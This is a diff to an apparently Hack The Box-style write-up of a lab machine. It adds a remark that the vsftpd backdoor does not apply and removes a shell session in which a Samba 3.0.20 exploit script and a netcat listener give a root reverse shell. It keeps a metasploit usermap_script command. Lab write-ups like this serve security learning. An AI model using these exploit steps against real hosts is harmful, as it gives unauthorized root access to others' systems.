@@ -176,6 +176,7 @@ rapid7: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
 
 exploit-db has the code: https://www.exploit-db.com/exploits/17491
 
+This machine does not seem to have this vulnerability however.
 
 ### Samba
 
@@ -326,43 +327,7 @@ drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
 -rw-r--r--  1 root root  118 Oct  4 12:53 vnc.log
 ```
 
-After running the msfvenom with the correct LHOST:
-
-```
-$ python3 exploit-smb-3.0.20.py
-
-$ nc -nvlp 1338
-listening on [any] 1338 ...
-connect to [10.10.14.15] from (UNKNOWN) [10.10.10.3] 32860
-whoami
-root
-
-ls -al /root
-total 80
-drwxr-xr-x 13 root root 4096 Oct  4 12:53 .
-drwxr-xr-x 21 root root 4096 Oct 31  2020 ..
--rw-------  1 root root  373 Oct  4 12:53 .Xauthority
-lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
--rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
-drwx------  3 root root 4096 May 20  2012 .config
-drwx------  2 root root 4096 May 20  2012 .filezilla
-drwxr-xr-x  5 root root 4096 Oct  4 12:53 .fluxbox
-drwx------  2 root root 4096 May 20  2012 .gconf
-drwx------  2 root root 4096 May 20  2012 .gconfd
-drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
-drwx------  4 root root 4096 May 20  2012 .mozilla
--rw-r--r--  1 root root  141 Oct 20  2007 .profile
-drwx------  5 root root 4096 May 20  2012 .purple
--rwx------  1 root root    4 May 20  2012 .rhosts
-drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
-drwx------  2 root root 4096 Oct  4 12:53 .vnc
-drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
--rwx------  1 root root  401 May 20  2012 reset_logs.sh
--rw-------  1 root root   33 Oct  4 12:53 root.txt
--rw-r--r--  1 root root  118 Oct  4 12:53 vnc.log
-```
-
-The same can be achieved with metasploit:
+The same can be achieved with metasploit (https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/):
 ```
 $ msfconsole -q
 msf6 > user exploit/multi/samba/usermap_script
